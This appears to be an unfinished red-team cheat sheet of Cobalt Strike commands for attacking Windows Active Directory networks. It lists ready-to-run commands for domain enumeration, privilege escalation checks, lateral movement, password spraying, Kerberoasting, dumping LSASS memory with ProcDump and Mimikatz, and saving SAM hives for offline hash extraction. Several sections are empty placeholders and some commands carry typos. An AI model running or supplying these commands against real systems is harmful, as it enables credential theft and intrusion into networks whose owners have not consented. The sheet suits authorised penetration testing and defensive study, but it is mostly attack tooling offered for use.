# NOTE: WORK IN PROGRESS 

# Cobalt Strike Red Team Cheat Sheet
---
## Domain Enumeration

Running PowerView and SharpView
```
# PowerView:
powershell-import --> Select PowerView.ps1 to import PS1 file in memory
powershell Get-Module PowerView
powershell Get-NetUser -Identity testuser -Domain lab.com

# SharpView
execute-assembly C:\SharpView.exe Invoke-CheckLocalAdminAccess --> Check servers for local admin using current privileges
```

Running ActiveDirectory module
```
powershell import --> Select \ADModule\Microsoft.ActiveDirectory.Management.dll  file from https://github.com/samratashok/ADModule
powershell Get-ADDomainController -Domain lab.com
```

Running Sharphound (.NET version of Bloodhound) for AD domain collection
```
# Running SharpView in memory (.NET version of PowerView)
execute-assembly C:\SharpHound.exe --CollectionMethod All --Domain lab.com --Stealth --excludedomaincontrollers --windowsonly --OutputDirectory C:\users\testuser\appdata\local\temp\

# Collecting only user sessions to determine who is logged in and where:
execute-assembly C:\SharpHound.exe --CollectionMethod Session,LoggedOn --Outputdirectory C:\temp\

# Collection methods reference: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html
```

[AD Recon tool](https://github.com/adrecon/ADRecon) - Perform different collection methods (ACLs, OUs, DCs, etc.) and output to Excel files
```
powershell-import --> ADRecon.ps1
# Perform all collection methods:
powershell ADRecon -OutputDir .\ -DomainController ops-dc.lab.com
```
-----------------------------------------------------------------------------------------
## Local Privilege Escalation
### PowerUp - PowerSploit module
```
powershell-import --> PowerUp.ps1
powershell Invoke-AllChecks | Out-File -Encoding ASCII PowerUp-checks.txt
```

### [SeatBelt](https://github.com/GhostPack/Seatbelt) - .NET tool by GhostPack  
GREAT tool to query a local system system/user/remote/misc data  
Can be used as Admin or normal-privileged user  
```
# Run ALL checks - returns TONS of data
execute-assembly C:\SeatBelt.exe -group=all -full -outputfile="C:\Temp\SeatBelt-all.json"

# Run only user-related checks - returns things like Chrome data, DPAPI keys, IE tabs, Windows vault/credentials, etc.
execute-assembly C:\SeatBelt.exe -group=user -outputfile="C:\Temp\SeatBelt-user.json"

# Run only system-related checks - returns things like Antivirus, Applocker, env path/variables, local users/groups, WMI, sysmon, UAC, etc.
execute-assembly C:\SeatBelt.exe -group=system -outputfile="C:\Temp\SeatBelt-system.json"

# Run only Chrome checks - returns bookmarks, history, presence
execute-assembly C:\SeatBelt.exe -group=chromium -outputfile="C:\Temp\SeatBelt-chrome.json"

# Run only remote-related checks - returns things like network shares, putty sessions, RDP connections/settings, Filezilla, Windows firewall, etc.
execute-assembly C:\SeatBelt.exe -group=remote -outputfile="C:\Temp\SeatBelt-remote.json"

# Run only miscellaneous-related checks - returns things like Chrome data, logon events, LOBAS, interesting files, downloads, PS events, scheduled tasks, etc.
execute-assembly C:\SeatBelt.exe -group=misc -outputfile="C:\Temp\SeatBelt-misc.json"
```

------------------------------------------------------------------------------------------
## Lateral Movement
Enable Powershell Remoting manually
```
# Enable on local system with Admin privileges
powershell Enable-PSRemoting –Force

# Enable on remote system 
make_token AD\admin Password123! --> Token with Admin privileges on remote system is required
shell psexec.exe \\TestComputer.lab.com -h -s powershell.exe Enable-PSRemoting -Force

# Test remote access
powershell Invoke-Command -ComputerName TestComputer -ScriptBlock { whoami; hostname }
```

[RACE.ps1](https://github.com/samratashok/RACE): ACL attacks for lateral movement, persistence and privilege escalation
```
powershell-import --> RACE.ps1
make_token AD\Admin password --> This tool will require Admin privileges on the remote system  

powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-dc.lab.com --> Force enable PS remoting for the specific user
powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-dc.lab.com --> Force enable WMI for the specific user
```

[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) - PS tools to perform SMB and WMI pass-the-hash attacks
```
fill
```

------------------------------------------------------------------------------------------
## Domain Privilege Escalation
### GPP Password
[Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

### Password spraying
[DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)
```
powershell-import --> DomainPasswordSpray.ps1
# Get the full domain user list
powershell Get-DomainUserList -Domain lab.com -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt

# Password spray from a username and password list
powershell Invoke-DomainPasswordSpray -UserList userlist.txt -PasswordList passlist.txt -Domain lab.com -OutFile sprayed-creds.txt

# Auto spray a specific password on an auto-generated user list (very noisy)
powershell Invoke-DomainPasswordSpray -Password Winter2020
```
Rubeus brute-force password spraying
```
execute-assembbly C:\Rubeus.exe brute /password:Password123! /domain:lab.com /noticket /outfile:passes-sprayed.txt [/passwords:PASSWORDS_FILE>] [/user:USER | /users:USERS_FILE] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/dc:DOMAIN_CONTROLLER]  [/verbose] [/nowrap]
```

### Kerberoasting
PowerView kerberoasting
```
# Get users with SPN set
powershell Get-DomainUesr -SPN

# Kerberoast all users
powershell Invoke-Kerberoast - OutputFormat hashcat | fl

# Kerberoast specific user
powershell Invoke-Kerberoast -Identity testaccount -Domain lab.com -OutputFormat hashcat | fl
```

Rubeus kerberoasting
```
# Kerberoast all users
execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHashes.txt /domain:lab.com

# Kerberoast specific user
execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:lab.com
```

------------------------------------------------------------------------------------------
## Exploitation

### Chrome Session Stealing
SharpDPAPI to dump domain master key (requires DA privileges)
```
fill in
```

SharpChrome - test
```
# Dumping Chrome login passwords on remote machines


# Dumping and decryptiong Chrome user sessions on remote machines

```

------------------------------------------------------------------------------------------
## Exfiltration - Password Attacks
### Dumping LSASS locally
Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but will often still output dump file)
```
upload --> ProcDump.exe
shell ProcDump.exe -accepteula -ma lsass.exe lsass.dmp
```
Dumping LSASS with [Out-Minidump.ps from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) without touching disk
```
powershell Get-Process | Out-Minidump -DumpFilePath C:\temp
```
Extracting hashes offline from LSASS using Mimikatz
```
mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "sekurlsa::wdigest" exit
```

### SAM database dump using reg.exe (requries local Admin)
```
shell reg.exe save HKLM\sam sam.save
shell reg.exe save HKLM\security security.save
shell reg.exe save HKLM\system system.save

# Download SAM files then dump hahses offline using Secretsdump.py
python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### NTDS.dit dump
[Secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump NTDS.dit remotely
```
fill
```
NTDSutil.exe to dump NTDS.dit locally on a Domain Controller
```
fill
```

------------------------------------------------------------------------------------------
# References
[Cobalt Strike commands cheat-sheet](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)

[Sharphound](https://github.com/BloodHoundAD/SharpHound3)

[PowerShell remoting cheat sheet](https://blog.netspi.com/powershell-remoting-cheatsheet/)

[Mimikatz reference cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)

[SpectreOps Cobalt Strike command reference](https://xzfile.aliyuncs.com/upload/affix/20190126174144-9767f9f2-214e-1.pdf)
